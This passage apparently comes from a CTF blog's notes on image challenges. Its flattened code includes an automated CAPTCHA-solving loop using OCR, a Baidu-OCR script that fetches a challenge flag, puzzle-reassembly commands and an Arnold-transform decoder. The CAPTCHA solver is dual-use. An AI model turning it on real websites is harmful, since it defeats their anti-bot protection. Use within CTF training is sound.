显示坐标轴plt.show()#保存图片plt.savefig(&#x27;xx.jpg&#x27;) ​ OCR验证码 123456789101112131415161718192021222324252627282930313233343536373839404142import osimport timeimport refrom PIL import Imageimport ddddocrimport onnxruntimeimport requestsfrom base64 import b64decodeurl = &quot;http://&quot;sess = requests.Session()ocr = ddddocr.DdddOcr(use_gpu=True)onnxruntime.set_default_logger_severity(3)def pic_to_text(text): img = re.findall(r&quot;base64,(.*?)&gt;&quot;, text)[0] open(&quot;v_code_LA.png&quot;, &quot;wb&quot;).write(b64decode(img.encode())) v_code = Image.open(&quot;v_code_LA.png&quot;) v_code.convert(&quot;L&quot;) v_code.save(&quot;v_code.png&quot;) v_code_bytes = open(&#x27;v_code.png&#x27;, &#x27;rb&#x27;).read() code = ocr.classification(v_code_bytes) os.remove(&quot;v_code.png&quot;) return code.lower()def validate(text): cnt = int(re.findall(r&quot;done (.*?) times&quot;, text)[0]) if cnt == 1000: print(text) return code = pic_to_text(text) if len(code) != 4: return data = &#123; &quot;v_code&quot;: code &#125; sess.post(url,data)if __name__ == &quot;__main__&quot;: while 1: res = sess.get(url) validate(res.text) time.sleep(2) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182# 百度APIfrom urllib import responseimport requestsimport base64url = &quot;http://47.97.127.1:28583/&quot;def getToken(): token_url = url + &quot;/getToken&quot; response = requests.get(token_url) return response.json()[&#x27;data&#x27;][&#x27;token&#x27;]def ocr(img_base64): # client_id 为官网获取的AK， client_secret 为官网获取的SK host = &#x27;https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&amp;client_id=【你的】&amp;client_secret=【你的】&#x27; response = requests.get(host) token = response.json()[&#x27;access_token&#x27;] &#x27;&#x27;&#x27; 通用文字识别（高精度版） &#x27;&#x27;&#x27; request_url = &quot;https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic&quot; params = &#123;&quot;image&quot;:img_base64&#125; access_token = token request_url = request_url + &quot;?access_token=&quot; + access_token headers = &#123;&#x27;content-type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;&#125; response = requests.post(request_url, data=params, headers=headers) return response.json()[&#x27;words_result&#x27;]def getViolWords(): words_url = url + &quot;/getViolWords&quot; response = requests.get(words_url) return response.json()[&#x27;data&#x27;][&#x27;violWords&#x27;] def getPic(token): pic_url = url + &quot;/getPic&quot; data = &#123;&quot;token&quot;:token&#125; response = requests.post(pic_url,json=data) return response.json()[&#x27;data&#x27;][&#x27;words&#x27;][&#x27;w1&#x27;]def checkWords(violWords,picWords): try: picWords = picWords[0][&#x27;words&#x27;] except: pass print(picWords) for i in violWords: if i.replace(&quot; &quot;,&#x27;&#x27;).strip() in picWords: return False return Truedef submit(token,answer): submit_url = url + &quot;/submits&quot; data = &#123;&quot;token&quot;:token,&quot;answer&quot;:answer&#125; response = requests.post(submit_url,json=data) return response.json()def getResult(token): result_url = url + &quot;/getResult&quot; data = &#123;&quot;token&quot;:token&#125; response = requests.post(result_url,json=data) return response.json()[&#x27;data&#x27;]def getFlag(token): flag_url = url + &quot;/getFlag&quot; data = &#123;&quot;token&quot;:token&#125; response = requests.post(flag_url,json=data) return response.json()token = getToken()violWords = getViolWords()for i in range(51): pic = getPic(token) picWords = ocr(pic) result = checkWords(violWords,picWords) print(result) print(submit(token,result)) print(getResult(token))print(getFlag(token)) ​ 拼图12345678910111213montage *.jpg -tile 10x12 -geometry +0+0 out.jpgmontage *.jpg -tile 10x12 -geometry 200x100+0+0 out.jpg #把图片碎片合成一个图片# 将目录中的jpg文件按顺序拼成x轴10块，y轴12块，每个图块大小为200x100像素，输出文件为out.jpggaps run out.jpg out2.jpggaps --image=out.jpg --size=100 --savegaps --image=out.jpg --generations=50 --population=120 --size=100 --save#还原原图片# --image 指向拼图的路径# --size 拼图块的像素尺寸（每张小图，即拼图小块的大小）# --generations 遗传算法的代的数量（迭代次数）# --population 个体数量（拼图总数）# --verbose 每一代训练结束后展示最佳结果（实时显示）# --save 将拼图还原为图像 ​ Arnold变换 / 猫脸变换12345678910111213141516171819202122232425262728293031323334import cv2import numpy as npdef arnold_decode(image, shuffle_times, a, b): &quot;&quot;&quot; decode for rgb image that encoded by Arnold Args: image: rgb image encoded by Arnold shuffle_times: how many times to shuffle Returns: decode image &quot;&quot;&quot; # 1:创建新图像 decode_image = np.zeros(shape=image.shape,dtype=int) # 2：计算N h, w = image.shape[0], image.shape[1] N = h # 或N=w # 3：遍历像素坐标变换 for time in range(shuffle_times): for ori_x in range(h): for ori_y in range(w): # 按照公式坐标变换 new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N new_y = ((-a) * ori_x + ori_y) % N decode_image[new_x, new_y, :] = image[ori_x, ori_y, :] return decode_imageimg = cv2.imread(&quot;a.png&quot;) #变换的图片a = 121b = 144st = 1pic = arnold_decode(img,st,a,b)cv2.imwrite(&#x27;b.png&#x27;,pic) #保存得到的图片 工具： Catmap Zhanxw Cat ​ 马赛克unredacter","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"图像","slug":"图像","permalink":"https://lazzzaro.github.io/tags/%E5%9B%BE%E5%83%8F/"}],"author":"Lazzaro"}],"categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"},{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"},{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"},{"name":"pwn","slug":"pwn","permalink":"https://lazzzaro.github.io/categories/pwn/"},{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"},{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"},{"name":"other","slug":"other","permalink":"https://lazzzaro.github.io/categories/other/"}],"tags":[{"name":"2024赛","slug":"2024赛","permalink":"https://lazzzaro.github.io/tags/2024%E8%B5%9B/"},{"name":"2023赛","slug":"2023赛","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"},{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"},{"name":"后量子密码","slug":"后量子密码","permalink":"https://lazzzaro.github.io/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/"},{"name":"js","slug":"js","permalink":"https://lazzzaro.github.io/tags/js/"},{"name":"混淆","slug":"混淆","permalink":"https://lazzzaro.github.io/tags/%E6%B7%B7%E6%B7%86/"},{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"},{"name":"格式化字符串","slug":"格式化字符串","permalink":"https://lazzzaro.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"堆","slug":"堆","permalink":"https://lazzzaro.github.io/tags/%E5%A0%86/"},{"name":"栈","slug":"栈","permalink":"https://lazzzaro.github.io/tags/%E6%A0%88/"},{"name":"OT","slug":"OT","permalink":"https://lazzzaro.github.io/tags/OT/"},{"name":"hash","slug":"hash","permalink":"https://lazzzaro.github.io/tags/hash/"},{"name":"WebAssembly","slug":"WebAssembly","permalink":"https://lazzzaro.github.io/tags/WebAssembly/"},{"name":"wasm","slug":"wasm","permalink":"https://lazzzaro.github.io/tags/wasm/"},{"name":"XXE","slug":"XXE","permalink":"https://lazzzaro.github.io/tags/XXE/"},{"name":"反调试","slug":"反调试","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"曲线","slug":"曲线","permalink":"https://lazzzaro.github.io/tags/%E6%9B%B2%E7%BA%BF/"},{"name":"node.js","slug":"node-js","permalink":"https://lazzzaro.github.io/tags/node-js/"},{"name":"绕过","slug":"绕过","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"},{"name":"Unity","slug":"Unity","permalink":"https://lazzzaro.github.io/tags/Unity/"},{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"},{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"Java","slug":"Java","permalink":"https://lazzzaro.github.io/tags/Java/"},{"name":"流量","slug":"流量","permalink":"https://lazzzaro.github.io/tags/%E6%B5%81%E9%87%8F/"},{"name":"USB","slug":"USB","permalink":"https://lazzzaro.github.io/tags/USB/"},{"name":"ECC","slug":"ECC","permalink":"https://lazzzaro.github.io/tags/ECC/"},{"name":"块密码","slug":"块密码","permalink":"https://lazzzaro.github.io/tags/%E5%9D%97%E5%AF%86%E7%A0%81/"},{"name":"AES","slug":"AES","permalink":"https://lazzzaro.github.io/tags/AES/"},{"name":"DES","slug":"DES","permalink":"https://lazzzaro.github.io/tags/DES/"},{"name":"格密码","slug":"格密码","permalink":"https://lazzzaro.github.io/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/"},{"name":"流密码","slug":"流密码","permalink":"https://lazzzaro.github.io/tags/%E6%B5%81%E5%AF%86%E7%A0%81/"},{"name":"XSS","slug":"XSS","permalink":"https://lazzzaro.github.io/tags/XSS/"},{"name":"SSRF","slug":"SSRF","permalink":"https://lazzzaro.github.io/tags/SSRF/"},{"name":"RSA","slug":"RSA","permalink":"https://lazzzaro.github.io/tags/RSA/"},{"name":"逃逸","slug":"逃逸","permalink":"https://lazzzaro.github.io/tags/%E9%80%83%E9%80%B8/"},{"name":"CSRF","slug":"CSRF","permalink":"https://lazzzaro.github.io/tags/CSRF/"},{"name":"JWT","slug":"JWT","permalink":"https://lazzzaro.github.io/tags/JWT/"},{"name":"渗透","slug":"渗透","permalink":"https://lazzzaro.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"提权","slug":"提权","permalink":"https://lazzzaro.github.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"内网","slug":"内网","permalink":"https://lazzzaro.github.io/tags/%E5%86%85%E7%BD%91/"},{"name":"命令行","slug":"命令行","permalink":"https://lazzzaro.github.io/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/"},{"name":"Linux","slug":"Linux","permalink":"https://lazzzaro.github.io/tags/Linux/"},{"name":"Bash","slug":"Bash","permalink":"https://lazzzaro.github.io/tags/Bash/"},{"name":"取证","slug":"取证","permalink":"https://lazzzaro.github.io/tags/%E5%8F%96%E8%AF%81/"},{"name":"隐写","slug":"隐写","permalink":"https://lazzzaro.github.io/tags/%E9%9A%90%E5%86%99/"},{"name":"脚本","slug":"脚本","permalink":"https://lazzzaro.github.io/tags/%E8%84%9A%E6%9C%AC/"},{"name":"密码","slug":"密码","permalink":"https://lazzzaro.github.io/tags/%E5%AF%86%E7%A0%81/"},{"name":"PHP","slug":"PHP","permalink":"https://lazzzaro.github.io/tags/PHP/"},{"name":"CMS","slug":"CMS","permalink":"https://lazzzaro.github.io/tags/CMS/"},{"name":"编码","slug":"编码","permalink":"https://lazzzaro.github.io/tags/%E7%BC%96%E7%A0%81/"},{"name":"反编译","slug":"反编译","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/"},{"name":"fuzz","slug":"fuzz","permalink":"https://lazzzaro.github.io/tags/fuzz/"},{"name":"SQL","slug":"SQL","permalink":"https://lazzzaro.github.io/tags/SQL/"},{"name":"注入","slug":"注入","permalink":"https://lazzzaro.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"反序列化","slug":"反序列化","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"RCE","slug":"RCE","permalink":"https://lazzzaro.github.io/tags/RCE/"},{"name":"SSTI","slug":"SSTI","permalink":"https://lazzzaro.github.io/tags/SSTI/"},{"name":"算法","slug":"算法","permalink":"https://lazzzaro.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"pwntools","slug":"pwntools","permalink":"https://lazzzaro.github.io/tags/pwntools/"},{"name":"自动化","slug":"自动化","permalink":"https://lazzzaro.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"angr","slug":"angr","permalink":"https://lazzzaro.github.io/tags/angr/"},{"name":"z3","slug":"z3","permalink":"https://lazzzaro.github.io/tags/z3/"},{"name":"IDA","slug":"IDA","permalink":"https://lazzzaro.github.io/tags/IDA/"},{"name":"Sage","slug":"Sage","permalink":"https://lazzzaro.github.io/tags/Sage/"},{"name":"gmpy2","slug":"gmpy2","permalink":"https://lazzzaro.github.io/tags/gmpy2/"},{"name":"Android","slug":"Android","permalink":"https://lazzzaro.github.io/tags/Android/"},{"name":"离散对数","slug":"离散对数","permalink":"https://lazzzaro.github.io/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/"},{"name":"文件上传","slug":"文件上传","permalink":"https://lazzzaro.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"图像","slug":"图像","permalink":"https://lazzzaro.github.io/tags/%E5%9B%BE%E5%83%8F/"}]}